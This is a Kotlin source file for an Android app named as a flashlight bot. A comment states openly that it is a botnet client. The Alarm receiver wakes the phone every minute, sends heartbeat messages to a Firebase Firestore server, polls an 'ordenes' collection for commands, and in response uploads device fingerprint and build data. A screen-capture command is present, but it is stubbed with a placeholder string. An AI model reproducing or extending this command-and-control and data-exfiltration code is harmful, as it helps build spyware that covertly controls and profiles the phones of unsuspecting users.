package com.linternbot

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.Context
import android.content.Context.CLIPBOARD_SERVICE
import android.content.Context.INPUT_METHOD_SERVICE
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.util.Log
import android.view.inputmethod.InputMethodManager
import android.widget.Toast
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.text.SimpleDateFormat
import java.util.*


class Alarm : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "app:alarm")
        wl.acquire()
        Toast.makeText(context, "Alarm !!!!!!!!!!", Toast.LENGTH_LONG).show(); // For example

        val c = Calendar.getInstance()
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
        val strDate: String = sdf.format(c.time)
        val db = Firebase.firestore

        // End of my code
        enviaImAlive(db, strDate)
        leePrimitiva(db, strDate)

        wl.release()
    }

    fun setAlarm(context: Context) {
        val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val i = Intent(context, Alarm::class.java)
        val pi = PendingIntent.getBroadcast(context, 0, i, 0)
        am.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis(),
            (1000 * 60 * 1).toLong(),
            pi
        ) // Millisec * Second * Minute
    }

    fun cancelAlarm(context: Context) {
        val intent = Intent(context, Alarm::class.java)
        val sender = PendingIntent.getBroadcast(context, 0, intent, 0)
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.cancel(sender)
        Toast.makeText(context, "Se ha parado la alarma", Toast.LENGTH_LONG).show(); // For example
    }

    fun leePrimitiva(db : FirebaseFirestore, strDate: String){
        db.collection("ordenes")
            .get()
            .addOnSuccessListener { result ->
                for (document in result) {
                    if(document.data["Primitiva"]!!.equals("CAPTURA")){
                        nuevaCaptura(db, strDate)
                        Log.d("TAG2", "Se añade nueva captura")
                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
                            Log.d("TAG2", "Orden de captura eliminada")
                        }
                    }
                    if(document.data["Primitiva"]!!.equals("DATOSDISPOSITIVO")){
                        nuevosDatosDispositivo(db, strDate)
                        Log.d("TAG2", "Se añade nuevos datos del dispositivo")
                        db.collection("ordenes").document(document.id).delete().addOnSuccessListener {
                            Log.d("TAG2", "Orden de datos de dispositivo eliminada")
                        }
                    }
                }
            }
            .addOnFailureListener { exception ->
                Log.d("TAG2", "Error getting documents: ", exception)
            }
    }

    fun enviaImAlive(db : FirebaseFirestore, strDate: String){
        val user = hashMapOf(
            "Bot ID" to idAndroid,
            "Hora" to strDate
        )

        // Add a new document with a generated ID
        db.collection("ImAlive").document(strDate).set(user)
        Log.d("TAG2","Se ha enviado un nuevo mensaje de ImAlive")
    }

    fun nuevaCaptura(db : FirebaseFirestore, strDate: String){

        val captura = hashMapOf(
            "Bot ID" to idAndroid,
            "Hora" to strDate,
            "Captura" to "Esto sería una captura de pantalla"
        )
        db.collection("ordenes")
            .whereEqualTo("Primitiva", "CAPTURA")
            .addSnapshotListener { snapshot, e ->
                if (e != null) {
                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                    return@addSnapshotListener
                }

                for (dc in snapshot!!.documentChanges) {
                    when (dc.type) {
                        DocumentChange.Type.ADDED -> db.collection("capturas").document(idAndroid).set(captura)
                    }
                }

            }

        Log.d("TAG2","Se ha ejecutado la tarea de toma de captura de pantalla")
    }

    fun nuevosDatosDispositivo(db : FirebaseFirestore, strDate: String){
        // Devuelve algunos valores del dispositivo que pueden ser de interes para la botnet
        // Fuente: https://stackoverflow.com/questions/38624319/get-android-phone-specs-programmatically
        val fields = Build.VERSION_CODES::class.java.fields
        var codeName = "UNKNOWN"
        fields.filter { it.getInt(Build.VERSION_CODES::class) == Build.VERSION.SDK_INT }
            .forEach { codeName = it.name }

        val datosDispositivo = hashMapOf(
            "Bot ID" to idAndroid,
            "Hora" to strDate,
            "RELEASE AND CODENAME" to Build.VERSION.RELEASE+codeName,
            "MODEL" to Build.MODEL,
            "ID" to Build.ID,
            "Manufacture" to Build.MANUFACTURER,
            "brand" to Build.BRAND,
            "type" to Build.TYPE,
            "user" to Build.USER,
            "BASE" to Build.VERSION_CODES.BASE,
            "INCREMENTAL" to Build.VERSION.INCREMENTAL,
            "SDK" to Build.VERSION.SDK,
            "BOARD" to Build.BOARD,
            "BRAND" to Build.BRAND,
            "HOST" to Build.HOST,
            "FINGERPRINT" to Build.FINGERPRINT,
            "Version Code" to Build.VERSION.RELEASE
        )
        db.collection("ordenes")
            .whereEqualTo("Primitiva", "DATOSDISPOSITIVO")
            .addSnapshotListener { snapshot, e ->
                if (e != null) {
                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                    return@addSnapshotListener
                }

                for (dc in snapshot!!.documentChanges) {
                    when (dc.type) {
                        DocumentChange.Type.ADDED -> db.collection("datosDispositivo").document(idAndroid).set(datosDispositivo)
                    }
                }

            }

        Log.d("TAG2","Se ha ejecutado la tarea de toma de datos del dispositiv")
    }
}